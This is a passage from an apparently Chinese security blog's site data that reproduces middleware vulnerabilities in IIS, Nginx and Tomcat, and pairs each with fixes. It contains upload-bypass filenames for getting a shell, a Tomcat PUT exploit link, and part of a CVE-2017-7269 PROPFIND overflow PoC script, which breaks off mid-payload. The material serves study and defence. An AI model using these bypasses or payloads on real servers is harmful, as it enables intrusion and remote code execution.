会话固定\n\n![006_4](/img/knowledge/Middleware_Parsing_vulnerability/006_4.png)\n\n##### xss漏洞\n\n##### 设置Cookie引发的CSRF漏洞\n\n#### 修复方式\n\n```\nlocation / {\n    return 302 https://$host$request_uri;\n}\n```\n\n# Tomcat相关 \n\n## PUT方法任意写文件漏洞 (CVE-2017-12615)\n\n### 漏洞条件\n\n在Tomcat安装目录下的配置文件web.xml中的org.apache.catalina.servlets.DefaultServlet方法下如果该方法有如下代码，即表示Tomcat已开启PUT方法\n\n```\n<init-param> \n      <param-name>readonly</param-name> \n      <param-value>false</param-value> \n</init-param>\n```\n\n![007_1](/img/knowledge/Middleware_Parsing_vulnerability/007_1.png)\n\n![007_2](/img/knowledge/Middleware_Parsing_vulnerability/007_2.png)\n\n### 利用exp\n\n`https://github.com/iBearcat/CVE-2017-12615`\n\n![007_3](/img/knowledge/Middleware_Parsing_vulnerability/007_3.png)\n\n![007_4](/img/knowledge/Middleware_Parsing_vulnerability/007_4.png)\n\n### 修复方式\n\n在Tomcat的web.xml 文件中配置org.apache.catalina.servlets.DefaultServlet的初始化参数\n\n```\n<init-param>\n      <param-name>readonly</param-name>\n      <param-value>true</param-value>\n</init-param>\n```\n\n确保readonly参数为true（默认值），即不允许DELETE和PUT操作。","slug":"中间件解析漏洞整理","published":1,"updated":"2019-06-19T17:23:13.402Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istnt00am4dsbbry6l69p","content":"<h1 id=\"中间件及其相关漏洞复现\"><a href=\"#中间件及其相关漏洞复现\" class=\"headerlink\" title=\"中间件及其相关漏洞复现\"></a>中间件及其相关漏洞复现</h1><h1 id=\"IIS相关\"><a href=\"#IIS相关\" class=\"headerlink\" title=\"IIS相关\"></a>IIS相关</h1><h2 id=\"IIS-5-x-6-x-解析漏洞\"><a href=\"#IIS-5-x-6-x-解析漏洞\" class=\"headerlink\" title=\"IIS 5.x-6.x 解析漏洞\"></a>IIS 5.x-6.x 解析漏洞</h2><p>一个细的知识点:IIS6.0 默认的可执行文件除了asp还包含这三种(aspx也能)</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/yyg.asa</span><br><span class=\"line\">/yyg.cer</span><br><span class=\"line\">/yyg<span class=\"selector-class\">.cdx</span> #本地测试失败,变成下载</span><br><span class=\"line\">/yyg.aspx</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h3><p>未修改配置的情况下,IIS<code>asa</code>,<code>asp</code>,<code>cdx</code>,<code>cer</code>这几个缀名映射的了负责解析的asp.dll。</p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/001_0.png\" alt=\"001_0\"></p>\n<p>iis 6.0解析漏洞有两种利用方式</p>\n<h3 id=\"目录解析\"><a href=\"#目录解析\" class=\"headerlink\" title=\"目录解析\"></a>目录解析</h3><figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"regexp\">/yyg.asp/yyg</span>.png</span><br></pre></td></tr></table></figure>\n\n<p>目录解析方式利用如上,在网站上建立了<code>.asp</code>或<code>.asa</code>等可利用的文件夹,在该文件夹下的任何扩张名的文件都会被IIS解析成asp文件来执行。</p>\n<p>一般的利用方式:</p>\n<p>创建目录<code>yyg.asp</code>,那么通过某种手段上传文件到该目录</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"regexp\">/yyg.asp/yyg</span>.png</span><br></pre></td></tr></table></figure>\n\n<p>无视后缀名即可拿shell</p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/001_1.png\" alt=\"001_1\"></p>\n<h3 id=\"文件解析\"><a href=\"#文件解析\" class=\"headerlink\" title=\"文件解析\"></a>文件解析</h3><figure class=\"highlight jboss-cli\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">/yyg.asp</span>;<span class=\"string\">.png</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/001_2.png\" alt=\"001_2\"></p>\n<p><code>/yyg.asp;.png</code>分号后面的<code>.png</code>不会被解析</p>\n<h3 id=\"修复方式\"><a href=\"#修复方式\" class=\"headerlink\" title=\"修复方式\"></a>修复方式</h3><p>由于微软认为这是IIS的特性,一直没有安全补丁,可以选择高版本的IIS.</p>\n<ol>\n<li>通过正则编写,阻止非法文件名上传</li>\n<li>进行权限设置,限制用户创建文件夹</li>\n</ol>\n<h2 id=\"IIS-7-0-IIS-7-5-Nginx-lt-8-03畸形解析漏洞解析漏洞\"><a href=\"#IIS-7-0-IIS-7-5-Nginx-lt-8-03畸形解析漏洞解析漏洞\" class=\"headerlink\" title=\"IIS 7.0/IIS 7.5/Nginx &lt;8.03畸形解析漏洞解析漏洞\"></a>IIS 7.0/IIS 7.5/Nginx &lt;8.03畸形解析漏洞解析漏洞</h2><h3 id=\"漏洞原理-1\"><a href=\"#漏洞原理-1\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h3><p>漏洞需要Fast-CGI调用php,并且在php.ini中需要cgi.fix_pathinfo=1。在这个选项被打开的情况下,php-fpm会<code>SCRIPT_FILENAME</code>是否存在，如果不存在则去掉最后一个<code>/</code>及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。所以，第一次fpm发现<code>yyg.png/.php</code>不存在，则去掉<code>/.php</code>，再判断<code>yyg.png</code>是否存在。当这个文件是存在的，会被作为PHP文件执行，导致解析漏洞。</p>\n<h3 id=\"IIS-7-5\"><a href=\"#IIS-7-5\" class=\"headerlink\" title=\"IIS 7.5\"></a>IIS 7.5</h3><p>测试环境:win7(x86)+IIS 7.0+php5.3.29  (php5.2.17,php5.4.45-nts,php5.6.27-nts,php7.0.12-nts,php7.1.13-nts,7.2.10-nts)</p>\n<p>win2008R2(x64)+IIS 7.0+php5.3.29  (php5.2.17,php5.4.45-nts,php5.6.27-nts,php7.0.12-nts,php7.1.13-nts,7.2.10-nts)</p>\n<p>需要php.ini中cgi.fix_pathinfo=1,通常情况下是默认开启。</p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/002_1.png\" alt=\"002_1\"></p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/002_2.png\" alt=\"002_2\"></p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/002_3.png\" alt=\"002_3\"></p>\n<h3 id=\"IIS-7-0\"><a href=\"#IIS-7-0\" class=\"headerlink\" title=\"IIS 7.0\"></a>IIS 7.0</h3><p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/002_4.png\" alt=\"002_4\"></p>\n<h3 id=\"IIS-7-0-7-5-修复方式\"><a href=\"#IIS-7-0-7-5-修复方式\" class=\"headerlink\" title=\"IIS 7.0/7.5 修复方式\"></a>IIS 7.0/7.5 修复方式</h3><p>1.如果需要继续FastCGI方式调用PHP,可以在php.ini中设置cgi.fix_pathinfo=0,修改保存后要重启IIS,可能影响到某些服务,谨慎使用。</p>\n<p>2.增强IIS设置</p>\n<p>在IIS里找到“处理程序映射”，然后对PHP这一项进行编辑，点击“请求限制”，把“仅当请求映射至以下内容时才调用处理程序”这个选项勾上即可；</p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/002_5.png\" alt=\"002_5\"></p>\n<p>查看解析结果</p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/002_6.png\" alt=\"002_6\"></p>\n<h3 id=\"Nginx\"><a href=\"#Nginx\" class=\"headerlink\" title=\"Nginx\"></a>Nginx</h3><h3 id=\"漏洞原理-2\"><a href=\"#漏洞原理-2\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h3><p>测试环境采用的是<code>vulhub</code>的<code>nginx/nginx_parsing_vulnerability</code>,说是Nginx的锅,实际还是和上面的一样,还是<code>cgi.fix_pathinfo=1</code>,当访问<code>ngnix.png/.php</code>时,<code>ngnix.png/.php</code>存在而进行修剪,最终将<code>ngnix.png</code>当php解析。</p>\n<p><img src=\"/img/knowledge/Middleware_Parsing_vulnerability/002_7.png\" alt=\"002_7\"></p>\n<h4 id=\"Nginx修复方式\"><a href=\"#Nginx修复方式\" class=\"headerlink\" title=\"Nginx修复方式\"></a>Nginx修复方式</h4><ol>\n<li><p>修改php.ini文件，将cgi.fix_pathinfo的值设置为0</p>\n</li>\n<li><p>正则表达式过滤非法输入,代码如下</p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#配置nginx.conf</span></span><br><span class=\"line\"><span class=\"attribute\">if</span> ( <span class=\"variable\">$fastcgi_script_name</span> <span class=\"regexp\">~ \\..*\\/.*php</span> ) &#123;</span><br><span class=\"line\">　　<span class=\"attribute\">return</span> <span class=\"number\">403</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在Nginx端使用<code>fastcgi_split_path_info</code>将path info信息去除后，用tryfiles判断文件是否存在；并借助PHP-FPM的<code>security.limit_extensions</code>配置项，避免其他后缀文件被解析。</p>\n</li>\n</ol>\n<h2 id=\"IIS6-0远程命令执行漏洞-CVE-2017-7269\"><a href=\"#IIS6-0远程命令执行漏洞-CVE-2017-7269\" class=\"headerlink\" title=\"IIS6.0远程命令执行漏洞(CVE-2017-7269)\"></a>IIS6.0远程命令执行漏洞(CVE-2017-7269)</h2><h3 id=\"漏洞原理-3\"><a href=\"#漏洞原理-3\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h3><p>开启WebDAV服务的IIS 6.0存在缓存区溢出漏洞导致远程代码执行</p>\n<h3 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h3><p>windows server2003</p>\n<h3 id=\"探测脚本\"><a href=\"#探测脚本\" class=\"headerlink\" title=\"探测脚本\"></a>探测脚本</h3><p><code>https://github.com/lcatro/CVE-2017-7269-Echo-PoC</code></p>\n<figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#https://github.com/lcatro/CVE-2017-7269-Echo-PoC</span><br><span class=\"line\">import socket</span><br><span class=\"line\">import sys</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">def generate_payload(port):</span><br><span class=\"line\">    pay='PROPFIND / HTTP/1.1<span class=\"symbol\">\\r</span><span class=\"symbol\">\\n</span>Host: localhost:'+ port  +'<span class=\"symbol\">\\r</span><span class=\"symbol\">\\n</span>Content-Length: 0<span class=\"symbol\">\\r</span><span class=\"symbol\">\\n</span>'</span><br><span class=\"line\">    pay+='If: &lt;http://localhost:' + port + '/aaaaaaa'</span><br><span class=\"line\">    pay+='<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>bd<span class=\"symbol\">\\x</span>a8<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>a3<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>84<span class=\"symbol\">\\x</span>b3<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a4<span class=\"symbol\">\\x</span>b6<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>b2<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>a8<span class=\"symbol\">\\x</span>b9<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>ad<span class=\"symbol\">\\x</span>b7<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>bd<span class=\"symbol\">\\x</span>b0<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>95<span class=\"symbol\">\\x</span>93<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>a9<span class=\"symbol\">\\x</span>8f<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>a8<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>99<span class=\"symbol\">\\x</span>a3<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b5<span class=\"symbol\">\\x</span>94<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>a5<span class=\"symbol\">\\x</span>93<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>ac<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>95<span class=\"symbol\">\\x</span>a7<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>a3<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>a4<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>98<span class=\"symbol\">\\x</span>b0<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a5<span class=\"symbol\">\\x</span>92<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>b1<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>b1<span class=\"symbol\">\\x</span>98<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a9<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>88<span class=\"symbol\">\\x</span>b1<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>b5<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>99<span class=\"symbol\">\\x</span>a4<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b1<span class=\"symbol\">\\x</span>87<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>94<span class=\"symbol\">\\x</span>b9<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>aa<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>b4<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>83<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>92<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>88<span class=\"symbol\">\\x</span>b2<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b5<span class=\"symbol\">\\x</span>8b<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b0<span class=\"symbol\">\\x</span>b4<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>87<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>a2<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>b3<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>99<span class=\"symbol\">\\x</span>b0<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>95<span class=\"symbol\">\\x</span>84<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>aa<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>b4<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>b9<span class=\"symbol\">\\x</span>8a<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>ab<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>a5<span class=\"symbol\">\\x</span>b6<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>b9<span class=\"symbol\">\\x</span>b3<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>b1<span class=\"symbol\">\\x</span>aa<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>ba<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>bd<span class=\"symbol\">\\x</span>b1<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>8a<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>88<span class=\"symbol\">\\x</span>b0<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>ae<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>ad<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>a3<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>bd<span class=\"symbol\">\\x</span>8c<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>95<span class=\"symbol\">\\x</span>96<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>95<span class=\"symbol\">\\x</span>b5<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>99<span class=\"symbol\">\\x</span>af<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>99<span class=\"symbol\">\\x</span>a8<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>b0<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>a8<span class=\"symbol\">\\x</span>b6<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>8b<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>95<span class=\"symbol\">\\x</span>97<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>95<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a9<span class=\"symbol\">\\x</span>b2<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>a9<span class=\"symbol\">\\x</span>ab<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>a2<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>99<span class=\"symbol\">\\x</span>98<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>88<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>94<span class=\"symbol\">\\x</span>b1<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>94<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b1<span class=\"symbol\">\\x</span>b9<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>8a<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>a2<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>b3<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>95<span class=\"symbol\">\\x</span>b7<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a9<span class=\"symbol\">\\x</span>b7<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>84<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>8c<span class=\"symbol\">\\x</span>b4<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>b6<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>b5<span class=\"symbol\">\\x</span>86<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>99<span class=\"symbol\">\\x</span>94<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>ac<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>95<span class=\"symbol\">\\x</span>83<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>98<span class=\"symbol\">\\x</span>b2<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>b8<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>a9<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>8c<span class=\"symbol\">\\x</span>b8<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>b2<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>a8<span class=\"symbol\">\\x</span>b0<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>a4<span class=\"symbol\">\\x</span>b8<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>88<span class=\"symbol\">\\x</span>c8<span class=\"symbol\">\\x</span>82<span class=\"symbol\">\\x</span>c8<span class=\"symbol\">\\x</span>82<span class=\"symbol\">\\x</span>e1<span class=\"symbol\">\\x</span>8b<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>83<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b1<span class=\"symbol\">\\x</span>84<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>96<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>ac<span class=\"symbol\">\\x</span>b7<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b1<span class=\"symbol\">\\x</span>ad<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>bd<span class=\"symbol\">\\x</span>98<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>9a<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>a5<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>a5<span class=\"symbol\">\\x</span>aa<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>8f<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>a9<span class=\"symbol\">\\x</span>92<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>99<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>e1<span class=\"symbol\">\\x</span>8f<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>83<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>b4<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>94<span class=\"symbol\">\\x</span>b1<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>bd<span class=\"symbol\">\\x</span>83<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b9<span class=\"symbol\">\\x</span>a6<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>ac<span class=\"symbol\">\\x</span>e1<span class=\"symbol\">\\x</span>8f<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a0<span class=\"symbol\">\\x</span>83<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>83<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>a9<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>92<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>8c<span class=\"symbol\">\\x</span>b0<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>a6<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>8c<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>8b<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>86<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>b3<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>a5<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>a9<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>a9<span class=\"symbol\">\\x</span>ac'</span><br><span class=\"line\">    pay+='&gt;'</span><br><span class=\"line\">    pay+=' (Not &lt;locktoken:write1&gt;) &lt;http://localhost:' + port + '/bbbbbbb'</span><br><span class=\"line\">    pay+='<span class=\"symbol\">\\x</span>e7<span class=\"symbol\">\\x</span>a5<span class=\"symbol\">\\x</span>88<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>b5<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>bd<span class=\"symbol\">\\x</span>83<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>bd<span class=\"symbol\">\\x</span>a7<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>ad<span class=\"symbol\">\\x</span>af<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>99<span class=\"symbol\">\\x</span>86<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>b5<span class=\"symbol\">\\x</span>e4<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>b3<span class=\"symbol\">\\x</span>e3<span class=\"symbol\">\\x</span>a1<span class=\"symbol\">\\x</span>b1<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>9d<span class=\"symbol\">\\x</span>a5<span class=\"symbol\">\\x</span>e5<span class=\"symbol\">\\x</span>a9<span 